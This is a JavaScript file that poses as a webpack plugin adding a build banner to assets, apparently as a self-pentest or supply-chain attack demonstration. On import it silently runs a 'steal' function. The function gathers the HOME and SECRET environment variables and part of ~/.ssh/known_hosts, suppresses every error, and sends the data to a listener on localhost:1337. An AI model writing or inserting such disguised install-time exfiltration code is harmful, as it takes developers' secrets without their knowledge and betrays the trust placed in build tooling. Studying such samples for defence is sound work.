const steal = async (perpetrator) => {
  try {
    const fs = require("fs");
    const path = require("path");
    const os = require("os");
    const secretFragment = []
    try {
      secretFragment.push(process.env.HOME)
      secretFragment.push(process.env.SECRET)
    } catch (e) {
      // silence
    }
   
    try {
      secretFragment.push(fs.readFileSync(path.join(os.homedir(), "/.ssh/known_hosts"), "utf8").substring(0,30));
    } catch (e) {
      // silence
    }
    
    const secretFragmentStr = secretFragment.join("?");
    await fetch(`http://localhost:1337/${perpetrator}?${secretFragmentStr}`, {
      method: "GET",
      mode: "no-cors",
      credentials: "omit",
    });
  } catch (e) {
    // silence
  }
};

class SelfpentestWebpackPlugin {
  apply(compiler) {
    // Stamp each emitted asset with a build banner
    compiler.hooks.compilation.tap('SelfpentestWebpackPlugin', (compilation) => {
      compilation.hooks.processAssets.tap(
        { name: 'SelfpentestWebpackPlugin', stage: compiler.webpack.Compilation.PROCESS_ASSETS_STAGE_ADDITIONS },
        (assets) => {
          for (const [name, asset] of Object.entries(assets)) {
            const banner = '/* built with selfpentest webpack plugin */\n';
            compilation.updateAsset(name, new compiler.webpack.sources.ConcatSource(banner, asset));
          }
        }
      );
    });
  }
}

const selfpentestWebpackPlugin = () => new SelfpentestWebpackPlugin();

steal("webpack");

module.exports = { selfpentestWebpackPlugin, SelfpentestWebpackPlugin };
